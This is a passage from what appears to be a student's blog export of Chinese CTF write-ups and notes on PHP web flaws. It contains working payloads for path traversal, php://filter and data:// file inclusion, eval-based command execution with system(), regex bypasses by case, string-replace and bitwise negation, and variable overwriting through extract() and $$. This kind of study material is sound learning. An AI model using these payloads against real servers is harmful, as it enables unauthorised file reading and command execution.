src="https://s3.ax1x.com/2021/01/15/s0YVjx.md.png" alt="s0YVjx.md.png"><br>而mb_strpos()函数作用如下  </p><blockquote><p>查找 “php” 在字符串中第一次出现的位置：</p></blockquote><p>他也有三个参数。<br><img src="https://s3.ax1x.com/2021/01/15/s0Yox1.md.png" alt="s0Yox1.md.png"><br>将这两个函数联系起来可以发现输入的page字符串最后被截取到“？”这个位置，如我们输入以下字符串  </p><blockquote><p>file=source.php?/../ffffllllaaaagggg</p></blockquote><p>那么再经过变换后得到的结果是source.php。正好可以符合白名单。<br>那么接下来就是进行目录穿越了。我们可以构造以下payload。  </p><blockquote><p>?file=source.php?/../../../../ffffllllaaaagggg</p></blockquote><p>注意../数量要够，否则没法到flag那个目录。<br><img src="https://s3.ax1x.com/2021/01/15/s0aUQs.md.png" alt="s0aUQs.md.png">  </p><hr><p>再看第三个判断。  </p><pre><code>            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#39;t see it&quot;;            return false;        &#125;  </code></pre><p>可以看出它多了一个urldecode()函数。也就是将url编码解码，因为当我们输入url后上传时，会自动解码一次。所以说如果我们将“？”连续url编码两次，那么在经过urldecode()函数后就又变成了？这样也可以绕过白名单，所以构造以下payload。  </p><blockquote><p>?file=hint.php%253f/../../../../../ffffllllaaaagggg</p></blockquote><p>同样得到flag。  </p>]]></content>
      
      
      <categories>
          
          <category> test4 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web第二周练习ssrf1</title>
      <link href="test3/undefined-undefined.html"/>
      <url>test3/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周第三道题目可以说是一波三折。  </p><h1 id="SSRF1"><a href="#SSRF1" class="headerlink" title="SSRF1"></a>SSRF1</h1><p>打开题目看到这样的代码<br><img src="https://s3.ax1x.com/2020/12/06/DO4JXQ.md.png" alt="DO4JXQ.md.png"><br>因为题目是SSRF，所以第一时间先去了解了SSRF的相关知识（详细的以后再写一篇博客）<br>简单来说如图<br><img src="https://s3.ax1x.com/2020/12/06/DO5SgS.md.png" alt="DO5SgS.md.png"><br>代码的第一个正则匹配就是对url的验证，它要求url里必须有<strong>dotnet.com</strong>这一字符串才能进行接下来的代码，也就是说才能访问内部系统。（dotnet.com也就相当于内网网址） </p><p>又因为代码最后给出解释flag在“/flag”里，这是一个目录，所以很容易就想到使用file://伪协议来读取网站下的文件，但是可以看到第二个正则匹配过滤掉了所有的php伪协议，并且不能使用大小写绕过，只给出了一个file _get _contents()函数，所以明显要从这个函数下手。  </p><p>但是从菜鸟教程得到的file _get _contents()函数的解释却很少，<br><img src="https://s3.ax1x.com/2020/12/06/DO5H2T.md.png" alt="DO5H2T.md.png"><br>对绕过这个正则函数好像没有什么用，于是又去网上搜索关于file _get _contents()函数的用法，但是搜到的最多只有它和伪协议php://input来搭配使用，依然没办法绕过这个正则函数。  </p><p>正当我正发愁时，终于发现了file _get _contents()函数的另一个用法</p><blockquote><p>当PHP的 file _get _contents() 函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞</p></blockquote><p>ohhhhhhhhhhhhh!!!<br>也就是说如果我们构造一个不存在的伪协议头的话，这个伪协议头就会成为一个目录的名称（如<strong>0://dotnet.com</strong>就会被当成目录），这样的话就相当于我们访问了这个网站的这个目录，我们只需不断向上跳转到根目录就能得到flag的文件，于是我构造了以下payload  </p><blockquote><p>?url=0://dotnet.com/../../../../../flag</p></blockquote><p>注意向上跳转的次数一定要够，否则就跳不到根目录。<br>最后就可以得到flag<br><img src="https://s3.ax1x.com/2020/12/06/DOI4yD.md.png" alt="DOI4yD.md.png"></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题其实总体来说并没有考到对ssrf的绕过方式（刚开始我以为是要绕过正则匹配到内网），这道题重点是在file _get _contents()函数，如何利用这个函数来绕过对伪协议的过滤，进行目录穿越。如果不知道这个函数还有这种用法，估计会卡死在伪协议的过滤上。</p>]]></content>
      
      
      <categories>
          
          <category> test3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二周习题1</title>
      <link href="test2/undefined-undefined.html"/>
      <url>test2/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>做了平台上更新的两道题，现在写一下做题思路。  </p><h1 id="php伪协议1"><a href="#php伪协议1" class="headerlink" title="php伪协议1"></a>php伪协议1</h1><p>打开题目，得到以下代码<br><img src="https://s3.ax1x.com/2020/12/03/DHp5Cj.md.png" alt="DHp5Cj.md.png"><br>由include()函数可以知道这是一道文件包含题，可以使用php伪协议来做，但是发现源代码里有一个正则函数，过滤了所有php伪协议相关的字符串。那么是不是就不能用伪协议了呢？并不是这样的。<br>再仔细观察这个函数的语法，发现它并没有区分要匹配的字符串的大小写（语法是/i）。也就是说如果我们传入Php这样的字符串的时候是不会被过滤掉的。而get传入并不区分大小写。所以有大写的伪协议同样有效。于是我们便可以利用大小写来绕过这个函数。  </p><hr><p><strong>关于正则表达式的详细语法</strong><br><a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式语法</a>  </p><hr><p>我构造的payload如下  </p><blockquote><p>?file=Php://filter/read=convert.Base64-encode/resource=flag</p></blockquote><p>从而得到base64编码过的flag文件<br><img src="https://s3.ax1x.com/2020/12/03/DHPiND.md.png" alt="DHPiND.md.png"><br>再解码就可以得到flag<br>随后又尝试了data://等协议，但是没有效果，不知道原因是什么。  </p><h1 id="php伪协议2"><a href="#php伪协议2" class="headerlink" title="php伪协议2"></a>php伪协议2</h1><p>打开题目，代码如下<br><img src="https://s3.ax1x.com/2020/12/03/DHPQUS.md.png" alt="DHPQUS.md.png"><br>这道题和上一道很像，但是匹配加上了不区分大小写这一条件，利用大小写绕过就不能再用了，这时又注意到一个新函数str_replace()，关于这个函数我在另一篇博客讲过了<br><a href="https://george186.github.io/test1/undefined-undefined.html">关于str_replace()函数</a><br>简单来说，就是它会搜索字符串里的<strong>troye</strong>这个字符串然后将其删除，这正好为我们提供了一个绕过方法，如果我们传入以下字符  </p><blockquote><p>phtroyep://filter/……..</p></blockquote><p>那么它不仅可以绕过第一个正则匹配，而且最终会变成以下字符串  </p><blockquote><p>php://filter/……..</p></blockquote><p>这样既绕过了正则函数，又使最后传入的是伪协议，从而达到读取flag的目的。于是我们构造以下payload  </p><blockquote><p>?file=ptroyehp://filter/read=convert.btroyease64-encode/resource=flag</p></blockquote><p>便可以得到base64编码过的flag，再解码就可以了。<br><img src="https://s3.ax1x.com/2020/12/03/DHi3dK.md.png" alt="DHi3dK.md.png">  </p><hr><p>这两道题是将正则函数绕过和php伪协议放在一起考了，比起单单只用伪协议要难一些。以后的ctf中应该都是这种多个方面在一起考查，所以不能只会一个方面的东西，知识面要广。</p>]]></content>
      
      
      <categories>
          
          <category> test2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界练习---伪协议</title>
      <link href="test1/undefined-undefined.html"/>
      <url>test1/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>做了一道关于伪协议的题，较本周的另两道简单，算是巩固一下关于伪协议的知识<br>打开地址得到以下源代码<br><img src="https://s3.ax1x.com/2020/12/02/DoJ5WR.md.png" alt="DoJ5WR.md.png"><br>有include()函数，可以知道是一道文件包含漏洞题，可以使用php伪协议来解决。（关于文件包含漏洞问题之后再进行总结）<br>再看到有这样一个函数  </p><blockquote><p>str_replace(“php://“, “”, $page);</p></blockquote><p>于是了解一下这个函数<br><img src="https://s3.ax1x.com/2020/12/02/DotOGd.md.png" alt="DotOGd.md.png"><br>可以知道，该函数会匹配get传参的字符串中的php://这个字符串，并将其替换成空格，等于过滤了这个字符串。所以我们不能直接使用php://协议。但是可以使用其他协议，我使用了data://协议。<br>该协议可以用该协议传递相应格式的数据。通常可以用来执行php代码<br>因此我们可以先构造payload来读取文件目录  </p><blockquote><p>?page=data://text/plain,<?php system('ls');?></p></blockquote><p>得到文件目录<br><img src="https://s3.ax1x.com/2020/12/02/DoNtL6.md.png" alt="DoNtL6.md.png"><br>可以知道包含flag的文件，接着使用命令执行函数读出该文件内容就可以得到flag<br><img src="https://s3.ax1x.com/2020/12/02/DoNDWd.md.png" alt="DoNDWd.md.png">  </p><hr><p>当然这道题还有别的解法,str_replace()函数默认情况下识别是分大小写的，所以我们可以通过大小写绕过这个函数，当我们知道包含flag的文件名后，利用大小写可以构造以下payload来绕过  </p><blockquote><p>?page=Php://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php</p></blockquote><p>得到base64编码过的php文件，再解码就可以得到flag</p>]]></content>
      
      
      <categories>
          
          <category> test1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议笔记</title>
      <link href="note2/undefined-undefined.html"/>
      <url>note2/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周学习了关于PHP的伪协议相关知识，现在做一下总结<br>先给出我学习的网址<br><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a><br><a href="https://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a><br>PHP伪协议包括file://、php://filter、php://input、zip://、compress.bzip2://、compress.zlib://、data://。下面介绍常用的几个  </p><h1 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h1><p>file://协议在双off的情况下也可以正常使用<br>allow_url_fopen ：off/on<br>allow_url_include：off/on<br>file://协议用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow _url _fopen与allow _url _include的影响。<br>使用方法<br>file:// [文件的绝对路径和文件名]  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</a>  </p></blockquote><p>file:// [文件的相对路径和文件名]  </p><blockquote><p><a href="http://127.0.0.1/include.php?file=./phpinfo.txt">http://127.0.0.1/include.php?file=./phpinfo.txt</a>  </p></blockquote><p>http://网络路径和文件名  </p><blockquote><p><a href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a>  </p></blockquote><h1 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h1><p>这个是我目前用到最多的，它包括php://filter、php://input、 php://stdin、 php://memory 和 php://temp,不需要开启allow _url _fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow _url _include。<br>其中php://filter和php://input使用较多<br><img src="https://s3.ax1x.com/2020/12/02/Do1AuF.md.png" alt="Do1AuF.md.png">  </p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>该协议用于读取源码<br><img src="https://s3.ax1x.com/2020/12/02/Do1GHH.md.png" alt="Do1GHH.md.png"><br><a href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=%5B%E6%96%87%E4%BB%B6%E5%90%8D%5D%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%BA%90%E7%A0%81%EF%BC%88%E9%92%88%E5%AF%B9php%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81base64%E7%BC%96%E7%A0%81%EF%BC%89">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</a>  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=flag.php">http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=flag.php</a></p></blockquote><h2 id="php-input-POST-DATA-执行php代码"><a href="#php-input-POST-DATA-执行php代码" class="headerlink" title="php://input+[POST DATA]执行php代码"></a>php://input+[POST DATA]执行php代码</h2><p>php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=php://input">http://127.0.0.1/cmd.php?file=php://input</a><br>[POST DATA] <?php phpinfo()?></p></blockquote><h1 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h1><p>使用条件allow _url _fopen ：on<br>allow _url _include：on<br>可以用该协议传递相应格式的数据。通常可以用来执行php代码<br>data://text/plain，<br>data://text/plain；base64，  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p><p><a href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p></blockquote><p>关于zip://、compress.bzip2://、compress.zlib://这三个协议目前还没有遇到相关题目，以后遇到再总结更新</p>]]></content>
      
      
      <categories>
          
          <category> note2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中foreach函数笔记</title>
      <link href="note1/undefined-undefined.html"/>
      <url>note1/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周做的题目中有一道变量覆盖问题，其中用到了foreach()函数，当时看到别人对这个函数的解释并没有很懂，于是自己又通过查找又了解一下这个函数用法，现在把自己的理解写出来。  </p><h1 id="foreach-函数—-关于-key的值"><a href="#foreach-函数—-关于-key的值" class="headerlink" title="foreach()函数—-关于$key的值"></a>foreach()函数—-关于$key的值</h1><p>先附上我学习这个函数的链接<br><a href="https://blog.csdn.net/qq_39388484/article/details/82839903">详解PHP中foreach的用法和实例</a><br><strong>foreach</strong>有两种语法<br>第一种：遍历给定的 数组语句 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p><blockquote><p>foreach (array_expression as $value)</p></blockquote><p>第二种：同上，同时当前单元的键名也会在每次循环中被赋给变量 $key。  </p><blockquote><p>foreach (array_expression as $key =&gt; $value)</p></blockquote><p>这个函数是要和数组搭配起来使用的，下面讲解一下基本的用法  </p><h2 id="一维数组与foreach"><a href="#一维数组与foreach" class="headerlink" title="一维数组与foreach"></a>一维数组与foreach</h2><p>列出一个一维数组<br>    $a = array(‘Tom’,’Mary’,’Peter’,’Jack’);<br>用第一种方法来输出<br>    foreach ($a as $value) {<br>    echo $value.”<br/>“;<br>    }<br>最后得到的结果是Tom，Mary，Peter，Jack<br>用第二种方法来输出  </p><pre><code>foreach ($a as $key =&gt; $value) &#123;  echo $key.&#39;,&#39;.$value.&quot;&lt;br/&gt;&quot;;&#125;  </code></pre><p>得到的结果是<br>0,Tom<br>1,Mary<br>2,Peter<br>3,Jack<br>很明显看到多了$key这个$key的值就是序号0，1，2，3等等<br>但是在题目中有这样一串代码<br>    $$key=$$value<br>当我传入?_200=flag后，结果变成了$ _200=$flag,这时的$key值不再是序号0，1，2，3······而是变成了 _200,这是为什么呢，我在一维关联数组中找到了类似变化  </p><h2 id="一维关联数组与foreach"><a href="#一维关联数组与foreach" class="headerlink" title="一维关联数组与foreach"></a>一维关联数组与foreach</h2><p>如下<br>    $b = array(‘a’=&gt;’Tom’,’b’=&gt;’Mary’,’c’=&gt;’Peter’,’d’=&gt;’Jack’);<br>这时我们再用第一种方法输出结果和上面的相同<br>但是用第二种方式输出则发生变化  </p><pre><code>foreach ($b as $key =&gt; $value) &#123;  echo $key.&#39;,&#39;.$value;&#125;  </code></pre><p>最后得到的结果是：<br>a,Tom<br>b,Mary<br>c,Peter<br>d,Jack<br>很明显，这时候的key值已经变成了关联的序号，也就是a,b,c,····<br>于是我推测，当我们使用post，get方式进行传参的时候，传入的就是一维关联数组，例如上面所讲到的?_ 200=flag就相当于’_ 200’=&gt;’flag’，这样一来，得到的最后结果就变成了$ _200=$flag，$key的值也就发生了变化，最终将flag传入到了变量$ _200中。  </p><hr><p>关于foreach还能和二维数组练习，但是key的值一般不会变化，依旧是序号0，1，2·····更多相关知识还是在分享的链接里查找吧。</p>]]></content>
      
      
      <categories>
          
          <category> note1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一周学习报告</title>
      <link href="note/undefined-undefined.html"/>
      <url>note/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>本周学习可以说是一路艰辛  </p><h2 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h2><p>搭建博客使用hexo+github好处多多—-<strong>前提是不报错</strong><br>分享一个搭建博客教学链接<br><a href="">https://www.simon96.online/2018/10/12/hexo-tutorial/</a><br>网上一般都有有报错解决办法，但是有的还是要靠自己摸索<br>下面分享一个我遇到的最坑问题<br>当所有过程都没问题后却发现自己网上博客一片空白（本地博客）没有问题，提供以下解决办法<br><a href="https://imgchr.com/i/D607F0"><img src="https://s3.ax1x.com/2020/11/28/D607F0.md.png" alt="D607F0.md.png"></a><br>将GitHub page路径改成master，因为我上传的文件路径都是master，但是它默认的路径是main，所以出现没有报错但是网上博客一片空白的情况。<br>这个坑卡了我好几天，甚至还删了充搭了一次。。。。。。  </p><h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>这个出问题自求多福不是玄学问题吧，实在不行换主题。（说多都是泪）  </p><hr><h2 id="web学习笔记"><a href="#web学习笔记" class="headerlink" title="web学习笔记"></a>web学习笔记</h2><h3 id="命令执行函数和eval-函数"><a href="#命令执行函数和eval-函数" class="headerlink" title="命令执行函数和eval()函数"></a>命令执行函数和eval()函数</h3><p>eval()函数能将输入的字符串当作PHP代码来执行，这就很容易造成漏洞，下面是本周做的题目中的一个例子  </p><blockquote><p>eval($_GET[‘a’]);</p></blockquote><p>很明显，这串代码相当于一个后门，只要你用get传参传入一串可执行的PHP代码就可以执行这串代码，注意结尾要加“；”。<br>命令执行函数常见的有以下几种<br>1、system<br>string system(string command,int &amp;return_var)</p><p>可以用来执行系统命令并将相应的执行结果输出</p><p>2、exec<br>string exec(string command,array &amp;outpub,int &amp;return_var)</p><p>command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值。</p><p>注意：exec输出的是命令执行结果的最后一行内容。如果你需要获取未经处理的全部输出数据，请使用passthru()函数。</p><p>如果想要获取命令的输出内容，请确保使用output参数。</p><p>3、passthru<br>void passthru(string command, int &amp;return_var)</p><p>command是要执行的命令，return_var存放执行命令后的状态值。</p><p>4、 shell_exec<br>string shell_exec(string command)</p><p>command是要执行的命令<br>我现在比较了解的就是system()函数，可以用的命令有很多这些命令和Linux里的命令相似  </p><blockquote><p>cat 一次显示整个文件  </p><p>tac 是将cat反过来写，所以他的功能和cat相反，cat是由第一行到最后一行连续显示在萤幕上，而 tac 则是由最后一行到第一行反向在萤幕上显示出来。</p><p>more  会以一页一页的显示方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页<br>显示，而且还有搜寻字串的功能 。但是在网页上好像不能翻页。 </p><p>less  与 more 类似，但使用 less 可以随意浏览文件使用[pageup] [pagedown] 等按键，而 more 仅能向后移动，却不能向前移动，而且 less 在查看之前不会加载整个文件。同样网页端好像不能翻页。</p></blockquote><p>介绍完eval()和命令执行函数后可以感觉到我们可以使用这一漏洞来查看，修改web服务器里的文件。所以在题目中我构造  </p><blockquote><p>/?a=system(‘ls’);<br>和  </p><blockquote><p>/?a=system(‘tac f111a9.php’);</p></blockquote></blockquote><p>便可以读出其中文件内容。  </p><h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>eval()虽然好用，但是遇上正则函数便失去作用，正则函数会过滤掉一些字符串，比如cat，tac等，这样就没有办法像一般那样直接传入函数命令，所以要绕过正则函数来上传。这里附上别人的总结<br><a href="https://blog.csdn.net/mochu7777777/article/details/104631142/">关于PHP正则匹配后代码执行的一些绕过方法</a><br>其中可以采取异或绕过，取反绕过，换行符绕过，利用正则回溯次数限制的绕过<br>这里介绍目前我能理解的两种绕过<br><strong>换行符绕过</strong><br>preg_match()函数只能匹配一行字符串，所以使用换行符%0a就可以绕过它的匹配<br><strong>url编码取反绕过</strong><br>这是取反绕过中最简单的一种绕过，该方法只适用于PHP7<br>对于想要传入的参数，先进行url编码再取反<br>例如传入构造一个phpinfo()；<br>只需要将phpinfo取反编码就行<br>如果需要执行有参数的函数，比如system(“ls”);<br>需要分别对system和ls进行取反，分别得到  </p><blockquote><p>%8C%86%8C%8B%9A%92 </p><p>%93%8C</p></blockquote><p>构建payload/?(<del>%8C%86%8C%8B%9A%92)(</del>%93%8C)；就可以绕过正则函数<br>其他的异或绕过和取反绕过以及利用回溯次数绕过需要用到脚本，等我变强了再来讨论吧hhhhh  </p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>附上学习的链接<br><a href="https://blog.csdn.net/qq_41381461/article/details/90047616">php变量覆盖</a><br>先总结我目前遇到的两种<br><strong>extract()函数变量覆盖</strong><br><a href="https://www.runoob.com/php/func-array-extract.html">菜鸟教程关于extract的讲解</a><br>总的来说extract()函数在默认情况下，会将传入的变量的值覆盖原有的变量的值，如以下代码<br>&lt;?php  </p><blockquote><p>$id=1;<br>extract($_GET);<br>echo $id;<br>?&gt;<br>//提交：?id=123<br>//结果： 123</p></blockquote><p>所以可以将原本不知道的变量的值进行覆盖，使其成为我们传入的值，对于  </p><blockquote><p>if($liwu==$flag) {<br>        echo’flag{xxxxxxxxxxx}’;</p></blockquote><p>这类代码漏洞十分有用。<br>**$$导致的变量覆盖问题**<br>在PHP中$$表示的是一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。如以下代码<br>&lt;?php  </p><blockquote><p>$c=’hello’;<br>$$c=’world’;<br>echo $c;<br>echo $$c;<br>?&gt;</p></blockquote><p>得到的结果是helloworld，也就是说将$c作为一个变量名进行赋值，从而覆盖了原来的$c=hello。<br>而使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。<br>&lt;?php  </p><blockquote><p>$id=5;<br>foreach ($_GET as $key =&gt; $value) {<br>$$key = $value;<br>}<br>echo $a;<br>?&gt;</p></blockquote><p>如果如果get传的是?id=1，那么，经过$$key=$value之后，就会变成$id=1，覆盖掉原来的$id=5。<br>如果代码如下<br>&lt;?php  </p><blockquote><p>$id=5;<br>foreach ($_GET as $key =&gt; $value) {<br>$$key = $$value;<br>}<br>echo $a;<br>?&gt;  </p></blockquote><p>那么如果get传入的是?id=flag,经过$$key = $$value之后就会变成$id=$flag，此时$flag里面的值，也就是flag已经被写入$id当中了。以上两组代码结合起来便可以实现  </p><blockquote><p>$_POST[“flag”] == $flag</p></blockquote><p>这样的要求<br>关于foreach()细节以后再另写笔记说。（因为写到这已经是凌晨一点半了。。。。。）  </p>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web第一周练习</title>
      <link href="test/undefined-undefined.html"/>
      <url>test/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>  第一周的web一共做了四道题，现在写下做题思路，以便日后回顾。</p><h1 id="一，basic-rec"><a href="#一，basic-rec" class="headerlink" title="一，basic rec"></a>一，basic rec</h1><p>打开题目地址，得到如下代码。<br><img src="https://s3.ax1x.com/2020/11/28/D6NtTf.md.png" alt="D6NtTf.md.png"><br>真正有用的函数只有一个</p><blockquote><p>eval($_GET[‘a’]);</p></blockquote><p>于是立刻学习关于eval函数的相关用法和知识<br>这是从菜鸟教程上得知的eval()函数的用法  </p><blockquote><p>eval() 函数把字符串按照 PHP 代码来计算。<br>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p></blockquote><p>所以可以看成这个网页已经被上传了一个木马，只要我们以get请求方式上传以下形式的字符到变量a，就能将被上传的字符串按照PHP代码来执行  </p><blockquote><p>/?a=”一串PHP代码”；（结尾要有分号才能执行该代码）</p></blockquote><p>但是该上传什么样的PHP代码呢，因为我要找到flag，所以要查看该网页服务器下有flag的文件，所以选用执行系统命令函数，该函数有以下几种system()passthru()exec()shell_exec()popen()proc_open()<br>pcntl_exec()，我选用的是system()函数<br>system()函数执行有回显，会将结果输出到页面上  </p><blockquote><p>string system ( string $command [, int &amp;$return_var ])</p></blockquote><p>$command是执行的命令，[]里的可选可不选，可以执行的命令与Linux中相似，有ls，cat，tac，more，less，等其中ls是显示文件目录，cat，tac等都是查看文件内容的命令，首先我查看文件目录，于是输入以下命令  </p><blockquote><p>/?a=system(‘ls’);</p></blockquote><p>得到文件目录<br><a href="https://imgchr.com/i/D6NrXn"><img src="https://s3.ax1x.com/2020/11/28/D6NrXn.md.png" alt="D6NrXn.md.png"></a><br>知道flag在f111a9.php中，接着便读取出该文件内容  </p><blockquote><p>/?a=system(‘tac f111a9.php’);</p></blockquote><p>得到flag。<br><a href="https://imgchr.com/i/D6NRtU"><img src="https://s3.ax1x.com/2020/11/28/D6NRtU.md.png" alt="D6NRtU.md.png"></a></p><h1 id="二，PHP变量覆盖"><a href="#二，PHP变量覆盖" class="headerlink" title="二，PHP变量覆盖"></a>二，PHP变量覆盖</h1><p>打开题目地址得到如下代码<br><a href="https://imgchr.com/i/D6Nhp4"><img src="https://s3.ax1x.com/2020/11/28/D6Nhp4.md.png" alt="D6Nhp4.md.png"></a>  </p><p>这道题目的重点是extrace()函数<br>extrace()将从数组中将变量导入到当前符号表，默认的是如果变量冲突，则覆盖已有的变量<br>知道这个函数后再对代码进行审计  </p><blockquote><p>$flag=’xxxxxxxx’;<br>extract($_GET); //以get传参的值会进过extract()函数<br>if(isset($liwu)) { //判断是否设立了$liwu该变量<br>    $content=trim(file_get_contents($flag)); //读取$flag的变量并将它赋给$content变量<br>    if($liwu==$content) {<br>        echo’flag{xxxxxxxxxxx}’; //如果$liwu和$content这两个变量相等就输出flag<br>    }<br>    else {<br>        echo ‘please try other operation.’;<br>    }<br>}  </p></blockquote><p>因为我不知道flag是什么，所以正常情况下不可能使$content这个变量等于$flag来得到真正的flag，所以我使用extrace()函数当传参时将$flag原来的值覆盖，这样就可以让这两个变量相等，从而得到flag。于是构造以下形式  </p><blockquote><p>/?$liwu=&amp;$flag=</p></blockquote><p>这样我们将$flag=空的值覆盖了原来的flag的值，从而使$liwu=$flag得到真正的flag。<br><a href="https://imgchr.com/i/D6NIXR"><img src="https://s3.ax1x.com/2020/11/28/D6NIXR.md.png" alt="D6NIXR.md.png"></a><br>但是不知道为什么构造/?$liwu=123&amp;$flag=123这样的不行。  </p><h1 id="三，basic-rce2"><a href="#三，basic-rce2" class="headerlink" title="三，basic rce2"></a>三，basic rce2</h1><p>代码如下<br><a href="https://imgchr.com/i/D6Uk4S"><img src="https://s3.ax1x.com/2020/11/28/D6Uk4S.md.png" alt="D6Uk4S.md.png"></a><br>这道题目和第一题本质差别不大，都是要用到执行系统命令函数，但是可以看出多了一个preg_match()函数。这是一个正则表达式函数，这个函数可以匹配查字符串中的所要搜索的字符，从题目函数可以看出，他规定了以下字符串<br>more，less，flag，head，nl，tail，tac，cat，rm，cp，mv，*，{<br>也就是说，如果我get传参的字符串中有这些字符串就会被返回，也就是不能执行所传代码，所以说不能像第一题那样直接输入/?Rem=system(‘cat xxxx’);来查看文件，但是还是可以来查看文件目录的，（没规定ls这个字符）<br><a href="https://imgchr.com/i/D6Unun"><img src="https://s3.ax1x.com/2020/11/28/D6Unun.md.png" alt="D6Unun.md.png"></a><br>得到有flag的文件。<br>下一步便是如何绕过这个匹配，这里我选择了取反绕过（换行绕过没成功，应该是掌握的有点问题）也就是将命令 ‘cat flag index.php’取反后再进行url编码再构造/?Rem=system(~xxxxxxxxx);即可绕过关于cat flag的匹配。<br>‘cat flag index.php’取反编码如下  </p><blockquote><p>%27%9C%9E%8B%DF%99%93%9E%98%DF%96%91%9B%9A%87%D1%8F%97%8F%27</p></blockquote><p>构造payload后传参便得到flag<br><a href="https://imgchr.com/i/D6UuBq"><img src="https://s3.ax1x.com/2020/11/28/D6UuBq.md.png" alt="D6UuBq.md.png"></a>  </p><h1 id="四，PHP变量覆盖2"><a href="#四，PHP变量覆盖2" class="headerlink" title="四，PHP变量覆盖2"></a>四，PHP变量覆盖2</h1><p>代码如下<br><a href="https://imgchr.com/i/D6UG34"><img src="https://s3.ax1x.com/2020/11/28/D6UG34.md.png" alt="D6UG34.md.png"></a><br>这次函数变成了foreach()同时多了一个$$这样的字符，而$$是这道题目的关键。<br>$$abc表示对$abc这个变量进行赋值，<br>而使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。<br>所以这道题要利用这两个foreach函数来使上传的参数flag等于$flag，进而得到flag。<br>通过代码最后一行可以知道我们要将$flag里的值赋予$_200最后才能输出flag。于是利用第一个foreach函数来构造paylod  </p><blockquote><p>/?_200=flag</p></blockquote><p>这样的结果是$$_200=$$flag,也就是将原来$_200的值覆盖成$flag里的值，也就是真正的flag。<br>接着使用第二个foreach函数来构造payload使我post传过去的flag=$flag,进而打印出$_200,于是构造以下payload  